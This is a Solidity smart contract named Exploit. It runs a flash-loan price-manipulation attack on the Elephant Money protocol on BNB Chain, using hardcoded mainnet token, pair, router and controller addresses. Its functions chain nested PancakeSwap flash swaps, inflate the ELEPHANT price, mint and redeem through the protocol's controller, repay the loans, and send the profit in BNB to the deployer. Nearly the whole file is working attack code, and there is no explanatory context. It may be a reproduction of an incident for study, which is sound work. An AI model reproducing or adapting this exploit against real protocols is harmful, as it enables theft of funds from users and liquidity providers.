// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IERC20 {
    function balanceOf(address owner) external returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
}

interface IWBNB is IERC20{
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

interface IPancakePair is IERC20{
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
}

interface IPancakeCallee {
    function pancakeCall(
        address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data
    ) external;
}

interface IPancakeSwapRouter  {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapETHForExactTokens(
        uint amountOut, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IElephantMoneyController {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external returns (uint256, uint256, uint256, uint256);
}

contract Exploit is IPancakeCallee{
    address private immutable _owner;

    IERC20 private constant _BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB private constant _WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant _ELEPHANT = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
    IERC20 private constant _TRUNK = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IPancakePair private constant _USDT_WBNB_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair private constant _CAKE_WBNB_PAIR = IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IPancakePair private constant _USDT_BUSD_PAIR = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    IPancakeSwapRouter private constant _pancakeSwapRouter = IPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IElephantMoneyController private constant _elephantMoneyContronller = IElephantMoneyController(0xD520a3B47E42a1063617A9b6273B206a07bDf834);

    uint256 private constant UINT256_MAX = type(uint).max;

    constructor() {
        _owner = msg.sender;    
    }

    function pancakeCall(
        address sender, 
        uint, 
        uint amount1, 
        bytes calldata
    ) external override{
        require(sender == address(this), "Oops");
        if(msg.sender == address(_USDT_WBNB_PAIR)) {
            _CAKE_WBNB_PAIR.swap(
                0,
                1000e18,
                address(this),
                new bytes(1)
            );
            _WBNB.transfer(address(_USDT_WBNB_PAIR), amount1 + amount1 * 3 / 997 + 1);
        }
        if(msg.sender == address(_CAKE_WBNB_PAIR)) {
            _USDT_BUSD_PAIR.swap(
                0,
                91035000e18,
                address(this),
                new bytes(1)
            );
            _WBNB.transfer(address(_CAKE_WBNB_PAIR), amount1 + amount1 * 3 / 997 + 1);
        }
        if(msg.sender == address(_USDT_BUSD_PAIR)) {
            address[] memory path = new address[](2);
            path[0] = address(_WBNB);
            path[1] = address(_ELEPHANT);
            _WBNB.approve(address(_pancakeSwapRouter), UINT256_MAX);

            //swap 130,162 BNB for  Elephant
            _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _WBNB.balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp
            );

            //mint 90,124,650 with 91,035,000 BUSD
            _BUSD.approve(address(_elephantMoneyContronller), UINT256_MAX);
            _elephantMoneyContronller.mint(_BUSD.balanceOf(address(this)));

            //swap 34,244,200,239,512 Elephant for BNB
            _ELEPHANT.approve(address(_pancakeSwapRouter), UINT256_MAX);
            path[0] = address(_ELEPHANT);
            path[1] = address(_WBNB);
            _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _ELEPHANT.balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp
            );

            //swap 45,000 TRUCK to BUSD
            _TRUNK.approve(address(_pancakeSwapRouter), UINT256_MAX);
            path[0] = address(_TRUNK);
            path[1] = address(_BUSD);
            _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                45000e18,
                0,
                path,
                address(this),
                block.timestamp
            );

            //redeem remainng truck to BUSD & Elephant
            _TRUNK.approve(address(_elephantMoneyContronller), UINT256_MAX);
            _elephantMoneyContronller.redeem(_TRUNK.balanceOf(address(this)));

            //swap all the remaining elephant to WBNB
            path[0] = address(_ELEPHANT);
            path[1] = address(_WBNB);
            _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _ELEPHANT.balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp
            );

            
            uint256 repayBusdAmount = amount1 + amount1 * 3 / 997 + 1;
            uint256 gap = repayBusdAmount - _BUSD.balanceOf(address(this));
            _WBNB.withdraw(_WBNB.balanceOf(address(this)));
            path[0] = address(_WBNB);
            path[1] = address(_BUSD);
            _pancakeSwapRouter.swapETHForExactTokens{ value : address(this).balance }(
                gap,
                path,
                address(this),
                block.timestamp
            );
            _BUSD.transfer(address(_USDT_BUSD_PAIR), _BUSD.balanceOf(address(this)));
            _WBNB.deposit{ value : address(this).balance }();
        }
    }
    
    function execute() external {
        require(msg.sender == _owner, "Oops");
        _USDT_WBNB_PAIR.swap(
            0, 
            130162e18,
            address(this),
            new bytes(1)
        );
        _WBNB.withdraw(_WBNB.balanceOf(address(this)));
        payable(_owner).transfer(address(this).balance);
    }

    receive() payable external {}
}